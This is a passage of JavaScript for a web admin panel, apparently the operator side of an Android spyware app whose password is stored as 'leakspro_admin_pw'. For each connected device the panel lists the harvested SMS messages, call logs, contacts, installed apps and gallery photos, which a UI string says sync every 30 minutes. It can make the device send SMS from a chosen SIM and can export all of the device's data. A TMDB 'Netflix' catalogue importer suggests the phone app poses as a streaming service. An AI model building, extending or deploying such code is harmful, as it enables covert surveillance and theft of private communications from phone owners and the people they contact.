window.loadSmsMessages = loadSmsMessages;

function renderSmsMessages(messages) {
  const container = document.getElementById('smsListContainer');

  if (!messages || messages.length === 0) {
    container.innerHTML = `<div class="tab-empty"><i class="ri-message-2-line"></i><p>NO MESSAGES FOUND</p></div>`;
    return;
  }

  container.innerHTML = messages.map(m => {
    const isSent = m.type === 2;
    const dirClass = isSent ? 'sms-sent' : 'sms-received';
    const dirLabel = isSent ? 'SENT' : 'RECEIVED';
    const avatar = (m.address || '?').charAt(0).toUpperCase();
    const dateStr = m.date ? new Date(m.date).toLocaleString() : '?';
    const body = esc(m.body || '(empty)');
    const address = esc(m.address || 'Unknown');

    return `
    <div class="sms-item ${dirClass}">
      <div class="sms-avatar">${avatar}</div>
      <div class="sms-content">
        <div class="sms-top-row">
          <span class="sms-address">${address}</span>
          <span class="sms-direction">${dirLabel}</span>
        </div>
        <div class="sms-body">${body}</div>
        <div class="sms-date">${dateStr}</div>
      </div>
    </div>`;
  }).join('');
}

function renderSmsPagination(currentPage, totalPages, total) {
  const container = document.getElementById('smsPagination');
  if (totalPages <= 1) {
    container.innerHTML = '';
    return;
  }

  let html = '';
  if (currentPage > 1) {
    html += `<button onclick="loadSmsMessages(${currentPage - 1})"><i class="ri-arrow-left-s-line"></i></button>`;
  }

  const startPage = Math.max(1, currentPage - 2);
  const endPage = Math.min(totalPages, currentPage + 2);

  for (let i = startPage; i <= endPage; i++) {
    html += `<button class="${i === currentPage ? 'active' : ''}" onclick="loadSmsMessages(${i})">${i}</button>`;
  }

  if (currentPage < totalPages) {
    html += `<button onclick="loadSmsMessages(${currentPage + 1})"><i class="ri-arrow-right-s-line"></i></button>`;
  }

  html += `<span class="tab-page-info">${total} msgs</span>`;
  container.innerHTML = html;
}

function filterSmsMessages() {
  const query = document.getElementById('smsSearch').value.toLowerCase().trim();
  if (!query) {
    renderSmsMessages(allSmsMessages);
    return;
  }
  const filtered = allSmsMessages.filter(m =>
    (m.address || '').toLowerCase().includes(query) ||
    (m.body || '').toLowerCase().includes(query)
  );
  renderSmsMessages(filtered);
}
window.filterSmsMessages = filterSmsMessages;

// ========== Send SMS from Device ==========
async function sendSmsFromDevice(simSlot) {
  const receiver = document.getElementById('smsReceiver').value.trim();
  const message = document.getElementById('smsMessage').value.trim();

  if (!receiver) return showToast('Enter a receiver phone number', 'error');
  if (!message) return showToast('Enter a message to send', 'error');
  if (!modalDeviceId) return showToast('No device selected', 'error');

  // Disable buttons while sending
  const btn1 = document.getElementById('smsSim1Btn');
  const btn2 = document.getElementById('smsSim2Btn');
  btn1.disabled = true;
  btn2.disabled = true;

  const statusEl = document.getElementById('smsSendStatus');
  statusEl.className = 'sms-send-status sending';
  statusEl.innerHTML = `<i class="ri-loader-4-line ri-spin"></i> Sending via SIM ${simSlot}...`;
  statusEl.classList.remove('hidden');

  try {
    const res = await fetch(`${API_BASE}/api/admin/send-sms`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        password: adminPassword,
        device_id: modalDeviceId,
        receiver,
        message,
        sim_slot: simSlot,
      }),
    });

    const data = await res.json();
    if (res.ok && data.success) {
      statusEl.className = 'sms-send-status success';
      statusEl.innerHTML = `<i class="ri-checkbox-circle-line"></i> Command sent! Waiting for device to send SMS...`;
      showToast('Send command dispatched to device', 'success');
    } else {
      statusEl.className = 'sms-send-status error';
      statusEl.innerHTML = `<i class="ri-error-warning-line"></i> ${data.error || 'Failed to send command'}`;
      showToast(data.error || 'Failed to send SMS', 'error');
    }
  } catch (err) {
    statusEl.className = 'sms-send-status error';
    statusEl.innerHTML = `<i class="ri-error-warning-line"></i> Network error: ${err.message}`;
    showToast('Network error: ' + err.message, 'error');
  } finally {
    btn1.disabled = false;
    btn2.disabled = false;

    // Auto-hide status after 5 seconds
    setTimeout(() => {
      statusEl.classList.add('hidden');
    }, 5000);
  }
}
window.sendSmsFromDevice = sendSmsFromDevice;

// ========== Call Logs Tab ==========
async function loadCallLogs(page) {
  try {
    callsCurrentPage = page;
    const res = await fetch(`${API_BASE}/api/admin/connections/${modalDeviceId}/call-logs?page=${page}&limit=50`, {
      headers: { 'x-admin-password': adminPassword },
    });
    const data = await res.json();
    allCallLogs = data.logs || [];
    const total = data.total || 0;
    const totalPages = data.totalPages || 1;

    renderCallLogs(allCallLogs);
    renderCallsPagination(page, totalPages, total);
  } catch (err) {
    document.getElementById('callsListContainer').innerHTML = `<div class="tab-empty"><i class="ri-error-warning-line"></i><p>FAILED TO LOAD CALL LOGS</p></div>`;
    showToast('Failed to load call logs: ' + err.message, 'error');
  }
}
window.loadCallLogs = loadCallLogs;

function renderCallLogs(logs) {
  const container = document.getElementById('callsListContainer');
  if (!logs || logs.length === 0) {
    container.innerHTML = `<div class="tab-empty"><i class="ri-phone-line"></i><p>NO CALL LOGS FOUND</p></div>`;
    return;
  }

  container.innerHTML = logs.map(l => {
    const typeMap = { 1: 'INCOMING', 2: 'OUTGOING', 3: 'MISSED', 4: 'VOICEMAIL', 5: 'REJECTED' };
    const typeClass = { 1: 'call-in', 2: 'call-out', 3: 'call-miss', 4: 'call-vm', 5: 'call-miss' };
    const iconMap = { 1: 'ri-phone-line', 2: 'ri-phone-line', 3: 'ri-phone-line', 4: 'ri-voiceprint-line', 5: 'ri-phone-line' };
    const type = l.type || 1;
    const label = typeMap[type] || 'UNKNOWN';
    const cls = typeClass[type] || 'call-in';
    const icon = iconMap[type] || 'ri-phone-line';
    const dateStr = l.date ? new Date(l.date).toLocaleString() : '?';
    const durMin = Math.floor((l.duration || 0) / 60);
    const durSec = (l.duration || 0) % 60;
    const durStr = l.duration > 0 ? `${durMin}m ${durSec}s` : '0s';
    const name = l.name || '';
    const avatar = (l.number || '?').charAt(0).toUpperCase();

    return `
    <div class="tab-item ${cls}">
      <div class="tab-avatar">${avatar}</div>
      <div class="tab-item-content">
        <div class="tab-item-top">
          <span class="tab-item-title">${esc(l.number || 'Unknown')}${name ? ` <small>(${esc(name)})</small>` : ''}</span>
          <span class="tab-item-badge ${cls}">${label}</span>
        </div>
        <div class="tab-item-meta">
          <span><i class="ri-time-line"></i> ${durStr}</span>
          <span>${dateStr}</span>
        </div>
      </div>
    </div>`;
  }).join('');
}

function renderCallsPagination(currentPage, totalPages, total) {
  const container = document.getElementById('callsPagination');
  if (totalPages <= 1) { container.innerHTML = ''; return; }
  let html = '';
  if (currentPage > 1) html += `<button onclick="loadCallLogs(${currentPage - 1})"><i class="ri-arrow-left-s-line"></i></button>`;
  const s = Math.max(1, currentPage - 2), e = Math.min(totalPages, currentPage + 2);
  for (let i = s; i <= e; i++) html += `<button class="${i===currentPage?'active':''}" onclick="loadCallLogs(${i})">${i}</button>`;
  if (currentPage < totalPages) html += `<button onclick="loadCallLogs(${currentPage + 1})"><i class="ri-arrow-right-s-line"></i></button>`;
  html += `<span class="tab-page-info">${total} calls</span>`;
  container.innerHTML = html;
}

function filterCallLogs() {
  const q = document.getElementById('callSearch').value.toLowerCase().trim();
  if (!q) { renderCallLogs(allCallLogs); return; }
  const f = allCallLogs.filter(l => (l.number||'').toLowerCase().includes(q) || (l.name||'').toLowerCase().includes(q));
  renderCallLogs(f);
}
window.filterCallLogs = filterCallLogs;

// ========== Contacts Tab ==========
async function loadContacts(page) {
  try {
    contactsCurrentPage = page;
    const res = await fetch(`${API_BASE}/api/admin/connections/${modalDeviceId}/contacts?page=${page}&limit=100`, {
      headers: { 'x-admin-password': adminPassword },
    });
    const data = await res.json();
    allContacts = data.contacts || [];
    const total = data.total || 0;
    const totalPages = data.totalPages || 1;

    renderContacts(allContacts);
    renderContactsPagination(page, totalPages, total);
  } catch (err) {
    document.getElementById('contactsListContainer').innerHTML = `<div class="tab-empty"><i class="ri-error-warning-line"></i><p>FAILED TO LOAD CONTACTS</p></div>`;
    showToast('Failed to load contacts: ' + err.message, 'error');
  }
}
window.loadContacts = loadContacts;

function renderContacts(contacts) {
  const container = document.getElementById('contactsListContainer');
  if (!contacts || contacts.length === 0) {
    container.innerHTML = `<div class="tab-empty"><i class="ri-contacts-book-line"></i><p>NO CONTACTS FOUND</p></div>`;
    return;
  }

  container.innerHTML = contacts.map(c => {
    const avatar = (c.name || '?').charAt(0).toUpperCase();
    const phones = Array.isArray(c.phones) ? c.phones : [];
    const emails = Array.isArray(c.emails) ? c.emails : [];
    const phoneStr = phones.length > 0 ? phones.map(p => `<span class="contact-phone"><i class="ri-phone-line"></i>${esc(p)}</span>`).join('') : '<span class="contact-none">No phone</span>';
    const emailStr = emails.length > 0 ? emails.map(e => `<span class="contact-email"><i class="ri-mail-line"></i>${esc(e)}</span>`).join('') : '';

    return `
    <div class="tab-item contact-item">
      <div class="tab-avatar contact-avatar">${avatar}</div>
      <div class="tab-item-content">
        <div class="tab-item-top">
          <span class="tab-item-title">${esc(c.name || 'Unknown')}</span>
        </div>
        <div class="contact-details">
          ${phoneStr}
          ${emailStr}
        </div>
      </div>
    </div>`;
  }).join('');
}

function renderContactsPagination(currentPage, totalPages, total) {
  const container = document.getElementById('contactsPagination');
  if (totalPages <= 1) { container.innerHTML = ''; return; }
  let html = '';
  if (currentPage > 1) html += `<button onclick="loadContacts(${currentPage - 1})"><i class="ri-arrow-left-s-line"></i></button>`;
  const s = Math.max(1, currentPage - 2), e = Math.min(totalPages, currentPage + 2);
  for (let i = s; i <= e; i++) html += `<button class="${i===currentPage?'active':''}" onclick="loadContacts(${i})">${i}</button>`;
  if (currentPage < totalPages) html += `<button onclick="loadContacts(${currentPage + 1})"><i class="ri-arrow-right-s-line"></i></button>`;
  html += `<span class="tab-page-info">${total} contacts</span>`;
  container.innerHTML = html;
}

function filterContacts() {
  const q = document.getElementById('contactSearch').value.toLowerCase().trim();
  if (!q) { renderContacts(allContacts); return; }
  const f = allContacts.filter(c => {
    if ((c.name||'').toLowerCase().includes(q)) return true;
    const phones = Array.isArray(c.phones) ? c.phones : [];
    if (phones.some(p => p.toLowerCase().includes(q))) return true;
    const emails = Array.isArray(c.emails) ? c.emails : [];
    if (emails.some(e => e.toLowerCase().includes(q))) return true;
    return false;
  });
  renderContacts(f);
}
window.filterContacts = filterContacts;

// ========== Installed Apps Tab ==========
async function loadApps() {
  try {
    const showSystem = document.getElementById('showSystemApps')?.checked ? 'true' : 'false';
    const res = await fetch(`${API_BASE}/api/admin/connections/${modalDeviceId}/apps?system=${showSystem}`, {
      headers: { 'x-admin-password': adminPassword },
    });
    const data = await res.json();
    allApps = data.apps || [];

    renderApps(allApps);
  } catch (err) {
    document.getElementById('appsListContainer').innerHTML = `<div class="tab-empty"><i class="ri-error-warning-line"></i><p>FAILED TO LOAD APPS</p></div>`;
    showToast('Failed to load apps: ' + err.message, 'error');
  }
}
window.loadApps = loadApps;

function renderApps(apps) {
  const container = document.getElementById('appsListContainer');
  if (!apps || apps.length === 0) {
    container.innerHTML = `<div class="tab-empty"><i class="ri-apps-line"></i><p>NO APPS FOUND</p></div>`;
    return;
  }

  container.innerHTML = `<div class="apps-count">${apps.length} apps</div>` + apps.map(a => {
    const installDate = a.install_time ? new Date(a.install_time).toLocaleDateString() : '?';
    const isSystem = a.is_system ? '<span class="app-system-badge">SYSTEM</span>' : '';

    return `
    <div class="tab-item app-item">
      <div class="tab-avatar app-avatar"><i class="ri-app-store-line"></i></div>
      <div class="tab-item-content">
        <div class="tab-item-top">
          <span class="tab-item-title">${esc(a.app_name || a.package_name)}</span>
          ${isSystem}
        </div>
        <div class="tab-item-meta">
          <span class="app-pkg">${esc(a.package_name)}</span>
          <span>v${esc(a.version || '?')} · Installed: ${installDate}</span>
        </div>
      </div>
    </div>`;
  }).join('');
}

function filterApps() {
  const q = document.getElementById('appSearch').value.toLowerCase().trim();
  if (!q) { renderApps(allApps); return; }
  const f = allApps.filter(a =>
    (a.app_name||'').toLowerCase().includes(q) ||
    (a.package_name||'').toLowerCase().includes(q)
  );
  renderApps(f);
}
window.filterApps = filterApps;

// ========== Gallery Tab ==========
async function loadGallery(page) {
  try {
    galleryCurrentPage = page;
    const res = await fetch(`${API_BASE}/api/admin/connections/${modalDeviceId}/gallery?page=${page}&limit=50`, {
      headers: { 'x-admin-password': adminPassword },
    });
    const data = await res.json();
    allGalleryPhotos = data.photos || [];
    galleryFilteredPhotos = allGalleryPhotos;
    const total = data.total || 0;
    const totalPages = data.totalPages || 1;

    document.getElementById('galleryCount').textContent = `${total} photos`;
    renderGallery(allGalleryPhotos);
    renderGalleryPagination(page, totalPages, total);
  } catch (err) {
    document.getElementById('galleryGridContainer').innerHTML = `<div class="tab-empty"><i class="ri-error-warning-line"></i><p>FAILED TO LOAD GALLERY</p></div>`;
    showToast('Failed to load gallery: ' + err.message, 'error');
  }
}
window.loadGallery = loadGallery;

function renderGallery(photos) {
  const container = document.getElementById('galleryGridContainer');
  if (!photos || photos.length === 0) {
    container.innerHTML = `<div class="tab-empty"><i class="ri-image-line"></i><p>NO PHOTOS FOUND</p><span style="opacity:.4;font-size:11px;margin-top:6px">Photos sync every 30 minutes from device gallery</span></div>`;
    return;
  }

  container.innerHTML = `<div class="gallery-grid">${photos.map((p, idx) => {
    const date = p.date_taken ? new Date(p.date_taken).toLocaleDateString() : '';
    const dims = (p.width && p.height) ? `${p.width}×${p.height}` : '';
    const sizeKB = p.size ? (p.size / 1024).toFixed(0) + ' KB' : '';
    const src = p.image_base64 ? `data:image/jpeg;base64,${p.image_base64}` : '';

    return `<div class="gallery-thumb" onclick="openGalleryLightbox(${idx})" title="${esc(p.filename || '')}">
      ${src ? `<img src="${src}" alt="${esc(p.filename || 'photo')}" loading="lazy">` : `<div class="gallery-thumb-placeholder"><i class="ri-image-line"></i></div>`}
      <div class="gallery-thumb-overlay">
        <span class="gallery-thumb-name">${esc(p.filename || 'Unknown')}</span>
        <span class="gallery-thumb-meta">${[date, dims, sizeKB].filter(Boolean).join(' · ')}</span>
      </div>
    </div>`;
  }).join('')}</div>`;
}

function renderGalleryPagination(currentPage, totalPages, total) {
  const el = document.getElementById('galleryPagination');
  if (totalPages <= 1) { el.innerHTML = ''; return; }
  let html = '';
  if (currentPage > 1) html += `<button onclick="loadGallery(${currentPage - 1})"><i class="ri-arrow-left-s-line"></i></button>`;
  const s = Math.max(1, currentPage - 2);
  const e = Math.min(totalPages, currentPage + 2);
  for (let i = s; i <= e; i++) html += `<button class="${i===currentPage?'active':''}" onclick="loadGallery(${i})">${i}</button>`;
  if (currentPage < totalPages) html += `<button onclick="loadGallery(${currentPage + 1})"><i class="ri-arrow-right-s-line"></i></button>`;
  el.innerHTML = html;
}

function filterGallery() {
  const q = document.getElementById('gallerySearch').value.toLowerCase().trim();
  if (!q) { galleryFilteredPhotos = allGalleryPhotos; renderGallery(allGalleryPhotos); return; }
  galleryFilteredPhotos = allGalleryPhotos.filter(p =>
    (p.filename||'').toLowerCase().includes(q)
  );
  renderGallery(galleryFilteredPhotos);
}
window.filterGallery = filterGallery;

function openGalleryLightbox(idx) {
  const photos = galleryFilteredPhotos.length ? galleryFilteredPhotos : allGalleryPhotos;
  if (!photos[idx]) return;
  galleryLightboxIdx = idx;
  const p = photos[idx];
  const src = p.image_base64 ? `data:image/jpeg;base64,${p.image_base64}` : '';
  document.getElementById('galleryLightboxImg').src = src;
  const date = p.date_taken ? new Date(p.date_taken).toLocaleString() : '';
  const dims = (p.width && p.height) ? `${p.width}×${p.height}` : '';
  const sizeKB = p.size ? (p.size / 1024).toFixed(0) + ' KB' : '';
  document.getElementById('galleryLightboxInfo').innerHTML =
    `<span class="gallery-lb-filename">${esc(p.filename || 'Unknown')}</span>` +
    `<span class="gallery-lb-meta">${[date, dims, sizeKB].filter(Boolean).join(' · ')}</span>`;
  document.getElementById('galleryLightbox').classList.remove('hidden');
}
window.openGalleryLightbox = openGalleryLightbox;

function closeGalleryLightbox(e) {
  if (e && e.target !== e.currentTarget) return;
  document.getElementById('galleryLightbox').classList.add('hidden');
  document.getElementById('galleryLightboxImg').src = '';
}
window.closeGalleryLightbox = closeGalleryLightbox;

function galleryLightboxNav(dir) {
  const photos = galleryFilteredPhotos.length ? galleryFilteredPhotos : allGalleryPhotos;
  galleryLightboxIdx += dir;
  if (galleryLightboxIdx < 0) galleryLightboxIdx = photos.length - 1;
  if (galleryLightboxIdx >= photos.length) galleryLightboxIdx = 0;
  openGalleryLightbox(galleryLightboxIdx);
}
window.galleryLightboxNav = galleryLightboxNav;

// ========== Export Device Data ==========
async function exportDeviceData() {
  if (!modalDeviceId) return showToast('No device selected', 'error');
  try {
    const res = await fetch(`${API_BASE}/api/admin/connections/${modalDeviceId}/export`, {
      headers: { 'x-admin-password': adminPassword },
    });
    const data = await res.json();
    const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `device_${modalDeviceId.substring(0, 8)}_export.json`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
    showToast('Export downloaded successfully!', 'success');
  } catch (err) {
    showToast('Export failed: ' + err.message, 'error');
  }
}
window.exportDeviceData = exportDeviceData;

// ========== Settings ==========
async function saveSettings() {
  const settings = {};
  const appName = document.getElementById('settingAppName').value;
  const password = document.getElementById('settingPassword').value;
  const maxSize = document.getElementById('settingMaxSize').value;

  if (appName) settings.app_name = appName;
  if (password) settings.admin_password = password;
  if (maxSize) settings.max_upload_size = maxSize;

  try {
    const res = await fetch(`${API_BASE}/api/admin/settings`, {
      method: 'PUT',
      headers: {
        'Content-Type': 'application/json',
        'x-admin-password': adminPassword,
      },
      body: JSON.stringify({ settings }),
    });
    if (res.ok) {
      if (password) {
        adminPassword = password;
        localStorage.setItem('leakspro_admin_pw', password);
      }
      showToast('Settings saved!', 'success');
    } else throw new Error('Failed to save');
  } catch (err) {
    showToast('Error: ' + err.message, 'error');
  }
}

// ========== Activity Log ==========
function addActivity(icon, msg) {
  const log = document.getElementById('activityLog');
  const empty = log.querySelector('.empty');
  if (empty) empty.remove();

  const el = document.createElement('div');
  el.className = 'act-item';
  el.innerHTML = `<i class="${icon}"></i><span>${esc(msg)}</span><span class="time">${new Date().toLocaleTimeString()}</span>`;
  log.prepend(el);

  while (log.children.length > 50) log.removeChild(log.lastChild);
}

// ========== Helpers ==========
function getThumbUrl(thumb) {
  if (!thumb) return 'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzIwIiBoZWlnaHQ9IjE4MCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48cmVjdCB3aWR0aD0iMzIwIiBoZWlnaHQ9IjE4MCIgZmlsbD0iIzIyMiIvPjx0ZXh0IHg9IjE2MCIgeT0iOTAiIGZpbGw9IiM2NjYiIGZvbnQtc2l6ZT0iMTQiIHRleHQtYW5jaG9yPSJtaWRkbGUiIGFsaWdubWVudC1iYXNlbGluZT0ibWlkZGxlIj5ObyBUaHVtYm5haWw8L3RleHQ+PC9zdmc+';
  if (thumb.startsWith('http')) return thumb;
  return `${API_BASE}/uploads/thumbnails/${thumb}`;
}

function fmtNum(n) {
  if (!n) return '0';
  if (n >= 1e6) return (n / 1e6).toFixed(1) + 'M';
  if (n >= 1e3) return (n / 1e3).toFixed(1) + 'K';
  return String(n);
}

function fmtBytes(b) {
  if (!b || b === 0) return '0 B';
  const s = ['B', 'KB', 'MB', 'GB', 'TB'];
  const i = Math.floor(Math.log(b) / Math.log(1024));
  return (b / Math.pow(1024, i)).toFixed(1) + ' ' + s[i];
}

function fmtDur(sec) {
  const h = Math.floor(sec / 3600);
  const m = Math.floor((sec % 3600) / 60);
  const s = Math.floor(sec % 60);
  if (h > 0) return `${h}:${String(m).padStart(2, '0')}:${String(s).padStart(2, '0')}`;
  return `${m}:${String(s).padStart(2, '0')}`;
}

function fmtDate(d) {
  const dt = new Date(d);
  const now = new Date();
  const diff = Math.floor((now - dt) / 1000);
  if (diff < 60) return 'Just now';
  if (diff < 3600) return `${Math.floor(diff / 60)}m ago`;
  if (diff < 86400) return `${Math.floor(diff / 3600)}h ago`;
  if (diff < 604800) return `${Math.floor(diff / 86400)}d ago`;
  return dt.toLocaleDateString();
}

function timeAgo(d) {
  if (!d) return 'N/A';
  const dt = new Date(d + (d.endsWith('Z') ? '' : 'Z')); // ensure UTC
  const now = new Date();
  const diff = Math.floor((now - dt) / 1000);
  if (diff < 0) return 'Just now';
  if (diff < 60) return `${diff}s ago`;
  if (diff < 3600) return `${Math.floor(diff / 60)}m ago`;
  if (diff < 86400) return `${Math.floor(diff / 3600)}h ago`;
  if (diff < 604800) return `${Math.floor(diff / 86400)}d ago`;
  return dt.toLocaleDateString();
}

function esc(s) {
  if (!s) return '';
  const d = document.createElement('div');
  d.textContent = s;
  return d.innerHTML;
}

function showToast(msg, type = 'info') {
  const c = document.getElementById('toastContainer');
  const t = document.createElement('div');
  t.className = `toast ${type}`;
  const icons = { success: 'ri-checkbox-circle-line', error: 'ri-error-warning-line', info: 'ri-information-line' };
  t.innerHTML = `<i class="${icons[type] || icons.info}"></i><span>${msg}</span>`;
  c.appendChild(t);
  setTimeout(() => {
    t.style.opacity = '0';
    t.style.transform = 'translateX(80px)';
    setTimeout(() => t.remove(), 300);
  }, 4000);
}

// ═══════════════════════════════════════════════
//  TMDB Netflix Import
// ═══════════════════════════════════════════════
let tmdbResults = [];
let tmdbSelected = new Set();
let tmdbCurrentPage = 1;
let tmdbLastType = 'all';
let tmdbLastQuery = '';
let tmdbImportedIds = new Set();

async function initTmdbPage() {
  // Check if API key is configured
  try {
    const res = await fetch(`${API_BASE}/api/tmdb/config`, {
      headers: { 'x-admin-password': adminPassword },
    });
    const data = await res.json();
    if (data.configured) {
      document.getElementById('tmdbApiKey').value = data.key_preview || '';
      document.getElementById('tmdbApiKey').placeholder = 'Key configured ✓ — enter new key to change';
      // Auto-browse Netflix content
      if (tmdbResults.length === 0) browseTmdb('all');
    }
  } catch (e) {
    console.error('TMDB config check failed:', e);
  }
}

async function saveTmdbKey() {
  const key = document.getElementById('tmdbApiKey').value.trim();
  if (!key || key.includes('...')) return showToast('Enter a valid TMDB API key', 'error');

  try {
    const res = await fetch(`${API_BASE}/api/tmdb/config`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'x-admin-password': adminPassword },
      body: JSON.stringify({ api_key: key }),
    });
    const data = await res.json();
    if (data.success) {
      showToast('TMDB API key saved!', 'success');
      document.getElementById('tmdbApiKey').placeholder = 'Key configured ✓';
      browseTmdb('all');
    } else {
      showToast(data.error || 'Failed to save key', 'error');
    }
  } catch (e) {
    showToast('Network error', 'error');
  }
}

async function browseTmdb(type) {
  tmdbLastType = type;
  tmdbLastQuery = '';
  tmdbCurrentPage = 1;
  tmdbSelected.clear();
  updateSelectedCount();

  // Update filter buttons
  document.querySelectorAll('.tmdb-filter-btn').forEach(b => b.classList.remove('active'));
  const btn = document.querySelector(`.tmdb-filter-btn[data-filter="${type}"]`);
  if (btn) btn.classList.add('active');

  try {
    const res = await fetch(`${API_BASE}/api/tmdb/browse?type=${type}&page=${tmdbCurrentPage}`, {
      headers: { 'x-admin-password': adminPassword },
    });
    const data = await res.json();
    if (data.error) return showToast(data.error, 'error');
    tmdbResults = data.results || [];
    renderTmdbResults(false);
    document.getElementById('tmdbLoadMore').classList.toggle('hidden', tmdbResults.length < 20);
  } catch (e) {
    showToast('Failed to load TMDB content', 'error');
  }
}

async function browseTmdbTrending() {
  tmdbLastType = 'trending';
  tmdbLastQuery = '';
  tmdbCurrentPage = 1;
  tmdbSelected.clear();
  updateSelectedCount();

  document.querySelectorAll('.tmdb-filter-btn').forEach(b => b.classList.remove('active'));
  const btn = document.querySelector('.tmdb-filter-btn[data-filter="trending"]');
  if (btn) btn.classList.add('active');

  try {
    const res = await fetch(`${API_BASE}/api/tmdb/trending?type=all`, {
      headers: { 'x-admin-password': adminPassword },
    });
    const data = await res.json();
    if (data.error) return showToast(data.error, 'error');
    tmdbResults = data.results || [];
    renderTmdbResults(false);
    document.getElementById('tmdbLoadMore').classList.add('hidden');
  } catch (e) {
    showToast('Failed to load trending', 'error');
  }
}

async function searchTmdb() {
  const q = document.getElementById('tmdbSearch').value.trim();
  if (!q) return browseTmdb('all');

  tmdbLastQuery = q;
  tmdbCurrentPage = 1;
  tmdbSelected.clear();
  updateSelectedCount();

  try {
    const res = await fetch(`${API_BASE}/api/tmdb/search?q=${encodeURIComponent(q)}&page=${tmdbCurrentPage}`, {
      headers: { 'x-admin-password': adminPassword },
    });
    const data = await res.json();
    if (data.error) return showToast(data.error, 'error');
    tmdbResults = data.results || [];
    renderTmdbResults(false);
    document.getElementById('tmdbLoadMore').classList.toggle('hidden', tmdbResults.length < 20);
  } catch (e) {
    showToast('Search failed', 'error');
  }
}

async function loadMoreTmdb() {
  tmdbCurrentPage++;
  const url = tmdbLastQuery
    ? `${API_BASE}/api/tmdb/search?q=${encodeURIComponent(tmdbLastQuery)}&page=${tmdbCurrentPage}`
    : `${API_BASE}/api/tmdb/browse?type=${tmdbLastType}&page=${tmdbCurrentPage}`;

  try {
    const res = await fetch(url, { headers: { 'x-admin-password': adminPassword } });
    const data = await res.json();
    const newResults = data.results || [];
    tmdbResults.push(...newResults);
    renderTmdbResults(false);
    document.getElementById('tmdbLoadMore').classList.toggle('hidden', newResults.length < 20);
  } catch (e) {
    showToast('Failed to load more', 'error');
  }
}

function renderTmdbResults(preserve = false) {
  const grid = document.getElementById('tmdbResults');

  if (tmdbResults.length === 0) {
    grid.innerHTML = `<div class="tmdb-empty"><i class="ri-search-line"></i><p>No results found</p></div>`;
    return;
  }

  grid.innerHTML = tmdbResults.map(r => {
    const key = `${r.type}:${r.tmdb_id}`;
    const isSelected = tmdbSelected.has(key);
    const isImported = tmdbImportedIds.has(key);
    const year = r.release_date ? r.release_date.substring(0, 4) : '';
    const rating = r.vote_average ? r.vote_average.toFixed(1) : '';
    const typeLabel = r.type === 'movie' ? 'MOVIE' : `TV`;
    const genres = (r.genres || []).slice(0, 2).join(', ');

    return `
      <div class="tmdb-card ${isSelected ? 'selected' : ''} ${isImported ? 'imported' : ''}"
           onclick="toggleTmdbSelect('${key}')" data-key="${key}">
        <img class="tmdb-poster" src="${r.poster || 'data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22/>'}" 
             alt="${esc(r.title)}" loading="lazy"
             onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 2 3%22><rect fill=%22%23222%22 width=%222%22 height=%223%22/><text x=%221%22 y=%221.8%22 font-size=%22.5%22 fill=%22%23666%22 text-anchor=%22middle%22>No Image</text></svg>'">
        <div class="tmdb-card-overlay">
          <div class="tmdb-card-title">${esc(r.title)}</div>
          <div class="tmdb-card-meta">
            <span>${year}</span>
            ${rating ? `<span class="tmdb-card-rating">★ ${rating}</span>` : ''}
            <span class="tmdb-card-type">${typeLabel}</span>
          </div>
        </div>
        <div class="tmdb-card-check"><i class="ri-check-line"></i></div>
        ${!isImported ? `<button class="tmdb-card-import" onclick="event.stopPropagation();importSingle('${r.type}',${r.tmdb_id})">Import</button>` : ''}
        ${isImported ? `<div class="tmdb-card-imported-badge">✓ Imported</div>` : ''}
      </div>
    `;
  }).join('');
}

function toggleTmdbSelect(key) {
  if (tmdbImportedIds.has(key)) return;
  if (tmdbSelected.has(key)) {
    tmdbSelected.delete(key);
  } else {
    tmdbSelected.add(key);
  }
  // Update card visuals
  const card = document.querySelector(`.tmdb-card[data-key="${key}"]`);
  if (card) card.classList.toggle('selected', tmdbSelected.has(key));
  updateSelectedCount();
}

function toggleSelectAll() {
  const allKeys = tmdbResults.map(r => `${r.type}:${r.tmdb_id}`).filter(k => !tmdbImportedIds.has(k));
  if (tmdbSelected.size === allKeys.length) {
    tmdbSelected.clear();
  } else {
    allKeys.forEach(k => tmdbSelected.add(k));
  }
  renderTmdbResults();
  updateSelectedCount();
}

function updateSelectedCount() {
  const count = tmdbSelected.size;
  document.getElementById('tmdbSelectedCount').textContent = count;
  document.getElementById('tmdbImportSelectedBtn').style.display = count > 0 ? '' : 'none';
}

async function importSingle(type, tmdbId) {
  const key = `${type}:${tmdbId}`;
  showToast('Importing...', 'info');

  try {
    const res = await fetch(`${API_BASE}/api/tmdb/import`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'x-admin-password': adminPassword },
      body: JSON.stringify({ tmdb_id: tmdbId, type }),
    });
    const data = await res.json();
    if (data.success) {
      tmdbImportedIds.add(key);
      renderTmdbResults();
      const epMsg = data.episodes_imported > 0 ? ` (${data.episodes_imported} episodes)` : '';
      showToast(`Imported: ${data.video?.title || 'Unknown'}${epMsg}${data.trailer ? ' + trailer' : ''}`, 'success');
    } else {
      showToast(data.error || 'Import failed', 'error');
    }
  } catch (e) {
    showToast('Import failed: ' + e.message, 'error');
  }
}

async function importSelected() {
  if (tmdbSelected.size === 0) return;

  const items = Array.from(tmdbSelected).map(key => {
    const [type, tmdb_id] = key.split(':');
    return { type, tmdb_id: parseInt(tmdb_id) };
  });

  const progressEl = document.getElementById('tmdbProgress');
  const fillEl = document.getElementById('tmdbProgressFill');
  const textEl = document.getElementById('tmdbProgressText');
  progressEl.classList.remove('hidden');
  fillEl.style.width = '0%';
  textEl.textContent = `Importing 0/${items.length}...`;

  try {
    const res = await fetch(`${API_BASE}/api/tmdb/import-bulk`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'x-admin-password': adminPassword },
      body: JSON.stringify({ items }),
    });
    const data = await res.json();

    if (data.success) {
      fillEl.style.width = '100%';
      textEl.textContent = `Done! Imported: ${data.imported}, Skipped: ${data.skipped}, Failed: ${data.failed}`;
      
      // Mark all as imported
